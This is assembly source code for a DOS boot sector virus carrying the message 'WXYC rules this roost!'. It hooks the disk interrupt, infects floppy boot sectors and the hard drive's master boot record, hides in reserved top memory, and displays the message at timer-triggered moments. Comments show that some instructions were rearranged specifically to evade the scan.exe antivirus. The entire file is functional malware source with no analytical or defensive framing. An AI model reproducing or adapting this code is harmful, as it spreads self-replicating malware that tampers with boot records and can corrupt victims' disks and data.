_TEXT   SEGMENT PARA PUBLIC 'CODE'
        ASSUME  CS:_TEXT, DS:_TEXT, ES:NOTHING, SS:NOTHING

P00100  PROC

;---------------------------------------

Start_Prog:
    JMP Start_Routine
    DB  'JAM WXYC'
    DB  20h Dup (0)     ;reserved space for bios parameter blk

;---------------------------------------

Drive_Byte:
    DB  00h     ;2b
Disk_Type:
    DB  02h     ;2c
Fool_Scan1:
    DB  0EAh
Old_13:
    DB  00h,00h     ;2e
Old_13_B:
    DB  00h,00h     ;30
Jump_Uptop:
    DB  0EAh
Top_Address:
    DB  00h,00h     ;33
Top_Address_B:
    DB  00h,00h     ;35

;---------------------------------------

Int_13:
    PUSH    DS
    PUSH    AX
    CMP AH,02h          ;only want to work on reads, writes
    JB  Real_13         ;   and verifies --- all other Int
    CMP AH,04h          ;   13h functions pass through
    JNB Real_13
    CMP DL,01h          ;only want for drives A: and B:
    JA  Real_13
    XOR AX,AX
    MOV DS,AX
    MOV AL,Byte Ptr DS:[043Fh]  ;and drive motor must not be on now
    TEST    AL,01h
    JZ  Got_Floppy
    TEST    AL,02h
    JNZ Real_13
Got_Floppy:
    CALL    Do_Routine

Real_13:
    POP AX          ;otherwise, go on to real Int 13h
    POP DS
    JMP Fool_Scan1
;   JMP DWord Ptr CS:[Old_13]   ; *** picked up by scan.exe

Do_Routine:
    PUSH    ES
    PUSH    SI
    PUSH    DI
    PUSH    BX
    PUSH    CX
    PUSH    DX
    MOV SI,0004h        ;try up to 4 times
Try_Again:
    MOV AX,0201h        ;set up regs to read boot record
    PUSH    CS
    POP ES
    MOV BX,0200h
    XOR CX,CX
    MOV DH,CH
    INC CX
    PUSHF
    CALL    DWord Ptr CS:[Old_13]   ;read boot record
    JNB No_Error
    XOR AX,AX           ;if error, reset disk and try again
    PUSHF
    CALL    DWord Ptr CS:[Old_13]
    DEC SI
    JNZ Try_Again
    JMP Short Get_Out       ;consistent error --- get out

No_Error:
    MOV SI,0006h        ;check if disk already infected
    MOV DI,0206h
    CLD
    PUSH    CS
    POP DS
    LODSW
    CMP AX,[DI]
    JNZ Not_Bitten
    LODSW
    CMP AX,[DI+02h]
    JZ  Get_Out         ;if so, get out

Not_Bitten:
    MOV CX,0020h        ;now move bios parameter block of
    MOV SI,020Bh        ;   floppy to new boot sector
    MOV DI,000Bh
    CLD
    REPZ    MOVSB

    MOV AX,0301h        ;go ahead and write real boot sector
    MOV BX,0200h        ;   to the disk
    MOV DH,01h

    MOV CL,Byte Ptr DS:[0216h]      ;but first note out what type
    MOV Byte Ptr DS:[Disk_Type],CL  ;   of floppy is being used
    CALL    Check_Disk
    PUSHF
    CALL    DWord Ptr CS:[Old_13]
    JB  Get_Out         ;if error, get out

    MOV AX,0301h        ;now write virus to boot sector
    XOR BX,BX
    MOV CL,01h
    XOR DH,DH
    PUSHF
    CALL    DWord Ptr CS:[Old_13]

Get_Out:
    POP DX
    POP CX
    POP BX
    POP DI
    POP SI
    POP ES
    RET

Check_Disk:
    CMP CL,03h          ;does the BPB say the disk has 3
    JNE Not_720         ;   sectors per FAT (720K disks)?
    MOV CL,05h          ;if so, write boot to sector 5
    RET
Not_720:
    CMP CL,09h          ;9 sectors per FAT (1.44meg disks)?
    JNE Not_144
    MOV CL,0Fh          ;write to sector 15
    RET
Not_144:
    CMP CL,07h          ;7 sectors per FAT (1.2meg disks)?
    JNE Not_120
    MOV CL,0Eh          ;write to sector 14
    RET
Not_120:
    MOV CL,03h          ;write to sector 3 for all others
    RET             ;  (correct for 360K, with 2 sec/FAT)

;---------------------------------------

Start_Routine:
    XOR AX,AX           ;set up registers
    PUSH    AX
    INT 13h         ;and reset disk
    POP AX
    MOV DS,AX
    CLI
    MOV SS,AX
    MOV SP,7C00h
    STI

    MOV CX,Word Ptr DS:[004Ch]  ;get and store CS and IP for Int 13h
    MOV Word Ptr DS:[7C2Eh],CX  ; *** use CX to fool scan.exe
    MOV AX,Word Ptr DS:[004Eh]
    MOV Word Ptr DS:[7C30h],AX

    MOV AX,Word Ptr DS:[0413h]  ;now decrease by 2K the apparent free
    DEC AX          ;   memory in the computer
    DEC AX
    MOV CL,06h          ;convert top of mem to a CS value
    MOV Word Ptr DS:[0413h],AX  ; *** swap out lines to fool scan.exe
    SHL AX,CL
    MOV Word Ptr DS:[7C35h],AX  ;and store it
    MOV ES,AX
    LEA AX,Top_Memory
    MOV Word Ptr DS:[7C33h],AX

    LEA AX,Int_13       ;reset vector for Int 13h
    MOV Word Ptr DS:[004Ch],AX
    MOV Word Ptr DS:[004Eh],ES

    PUSH    CS          ;now move all virus code to top of
    POP DS          ;   memory and jump to it
    MOV CX,200h
    MOV SI,7C00h
    XOR DI,DI
    CLD
    REPZ    MOVSB
    JMP Jump_Uptop

;---------------------------------------

Top_Memory:
    XOR AX,AX           ;land here after jump to top of mem
    MOV ES,AX
    PUSH    CS
    POP DS
    TEST    Byte Ptr ES:[046Ch],07h ;test byte in timer to see when to
    JNZ No_Write        ;  write message
    LEA SI,String_Address
Next_Letter:
    LODSB
    OR  AL,AL
    JZ  No_Write
    MOV AH,0Eh
    MOV BH,00h
    INT 10h         ;write message
    JMP Short Next_Letter

No_Write:
    MOV AX,0201h
    MOV BX,7C00h
    CMP Byte Ptr DS:[Drive_Byte],00h    ;check to see if booting off
    JZ  From_Floppy         ;   hard or floppy drives

    MOV CX,0003h        ;read original boot sector to memory
    MOV DX,0080h
    INT 13h
    JMP Short Skip_Sequence

From_Floppy:
    MOV CH,00h          ;read original boot sector to memory
    MOV DX,0100h
    MOV CL,Byte Ptr DS:[Disk_Type]
    CALL    Check_Disk
    INT 13h
    JB  Skip_Sequence

    PUSH    CS          ;read hard drive boot sector
    POP ES
    MOV AX,0201h
    MOV BX,0200h
    MOV CL,01h
    MOV DX,0180h
    INT 13h
    JB  Skip_Sequence

    MOV SI,0206h        ;check to see if hard drive infected
    MOV DI,0006h
    LODSW
    CMP AX,[DI]
    JNZ Infect_Hard
    LODSW
    CMP AX,[DI+02h]
    JNZ Infect_Hard

Skip_Sequence:
    MOV Byte Ptr DS:[Drive_Byte],00h    ;mark byte to show floppy drive
    DB  0EAh,00h,7Ch,00h,00h        ;and jump to real boot sector

;---------------------------------------

Infect_Hard:
    MOV Byte Ptr DS:[Drive_Byte],02h    ;mark byte to show hard drive

    MOV AX,0301h            ;write real boot sector to
    MOV BX,0200h            ;   head 0, track 0, sector 3
    MOV CX,0003h            ;   (normally unused?)
    MOV DX,0080h
    INT 13h
    JB  Skip_Sequence

    MOV CX,0020h        ;move bios parameter block of
    MOV SI,020Bh        ;   floppy to new boot sector
    MOV DI,000Bh
    CLD
    REPZ    MOVSB

    MOV AX,0301h        ;write new boot sector to C: drive
    XOR BX,BX
    INC CL
    INC DH
    INT 13h
    JMP Short Skip_Sequence

;---------------------------------------

String_Address:
    DB  'WXYC rules this roost!',07h,0Dh,0Ah,0Ah,00h
    DB  00h,55h,0AAh

End_Prog:

P00100  ENDP

_TEXT   ENDS

        END
        